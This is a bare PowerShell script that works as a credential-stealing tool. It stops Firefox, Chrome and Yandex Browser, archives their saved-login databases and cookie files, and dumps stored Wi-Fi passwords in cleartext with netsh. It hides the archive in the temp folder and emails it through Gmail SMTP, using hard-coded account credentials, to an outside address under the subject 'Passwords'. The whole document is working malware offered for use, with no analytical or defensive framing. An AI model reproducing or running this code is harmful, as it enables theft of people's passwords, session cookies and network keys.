echo "qwe"

$p=$env:TEMP+"\d"+(Get-Random -max 17071707)+".zip"

if(Test-Path -Path "C:\Program Files\WinRAR\WinRAR.exe"){$arh="WinRar"}elseif(Test-Path -Path "C:\Program Files\7-Zip\7z.exe"){Set-Location -Path "C:\Program Files\7-Zip\";$arh="7-Zip"}

$f=($env:APPDATA+"\Mozilla\Firefox\Profiles\*");if(Test-Path -Path $f){Stop-Process -Name firefox -ErrorAction SilentlyContinue;
if("WinRAR"-in $arh){Get-ChildItem -Path $f -Include "logins.json","*.db" -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
elseif("7-Zip" -in $arh){.\7z.exe a $p (Get-ChildItem -Path $f -Include "logins.json","*.db" -Recurse) -spf -tzip}}else{echo "asd"}

$g=($env:LOCALAPPDATA+"\Google\Chrome\User Data\Default\");if(Test-Path -Path $g){Stop-Process -Name chrome -ErrorAction SilentlyContinue;
if("WinRAR"-in $arh){Get-ChildItem -Path $g -Include "Login Data", "Cookies" -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
elseif("7-Zip" -in $arh){.\7z.exe a $p ($g+"Login Data") ($g+"Cookies") -spf -tzip}}else{echo "asd"}

$y=($env:LOCALAPPDATA+"\Yandex\YandexBrowser\User Data\Default\");if(Test-Path -Path $y){Stop-Process -Name browser -ErrorAction SilentlyContinue;
if("WinRAR" -in $arh){Get-ChildItem -Path $y -Include ("Ya Passman Data"), ("Cookies") -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
elseif("7-Zip"-in $arh){.\7z.exe a $p ($y+"Ya Passman Data"),($y+"Cookies") -spf -tzip}}else{echo "asd"}

(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ESSID=$name;PASS=$pass }} | Format-Table -AutoSize > $env:TEMP\p.txt
if("WinRAR" -in $arh){Get-ChildItem -Path $env:TEMP\p.txt | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
elseif("7-Zip"-in $arh){.\7z.exe a $p $env:TEMP\p.txt -spf -tzip}}else{echo "asd"}
attrib +H $p

$SMTPServer="smtp.gmail.com";$SMTPInfo=New-Object Net.Mail.SmtpClient($SmtpServer,587);$SMTPInfo.EnableSsl=$true
$SMTPInfo.Credentials=New-Object System.Net.NetworkCredential("f7swwq@gmail.com","parampam1");$ReportEmail=New-Object System.Net.Mail.MailMessage
$ReportEmail.From="f7swwq@gmail.com";$ReportEmail.To.Add("keklol2045@gmail.com");$ReportEmail.Subject="Passwords"
$s=New-Object Net.Mail.Attachment($p);if("WinRAR"-in $arh){$ReportEmail.Attachments.Add($s)}else{$ReportEmail.Attachments.Add($s)};$SMTPInfo.Send($ReportEmail)